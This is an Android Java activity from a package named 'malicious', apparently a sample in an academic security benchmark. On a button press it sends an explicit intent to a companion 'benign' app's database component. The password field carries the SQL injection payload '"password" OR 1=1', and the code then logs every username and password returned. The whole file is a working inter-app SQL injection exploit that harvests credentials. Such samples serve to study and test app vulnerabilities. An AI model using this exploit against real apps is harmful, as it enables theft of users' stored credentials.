package edu.ksu.cs.malicious;

import android.content.Intent;
import android.os.Bundle;
import android.support.v7.app.AppCompatActivity;
import android.util.Log;
import android.view.View;
import android.widget.Button;
import android.widget.TextView;

public class MainActivity extends AppCompatActivity {

    private static String TAG = "Malicious";

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
    }

    @Override
    protected void onResume() {
        super.onResume();
        final Button injBtn = (Button) findViewById(R.id.injectButton);
        injBtn.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                final int REQ_CODE = 100;
                String username = "\"Jhontu\"";
                String password = "\"password\" OR 1=1";
                Intent intent = new Intent("edu.ksu.cs.benign.DB");
                intent.setPackage("edu.ksu.cs.benign");
                intent.putExtra("username", username);
                intent.putExtra("password", password);
                intent.putExtra("requestCode", REQ_CODE);
                startActivityForResult(intent, REQ_CODE);
            }
        });
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        final TextView res = (TextView) findViewById(R.id.result);
        if (resultCode == RESULT_OK) {
            res.setText("Success");
            String[] usernames = data.getStringArrayExtra("username");
            String[] passwords = data.getStringArrayExtra("password");
            for (int i = 0; i < usernames.length; ++i) {
                Log.d(TAG, "Username: " + usernames[i] + " Password: " + passwords[i]);
            }
        } else {
            res.setText("Failure");
        }
    }
}
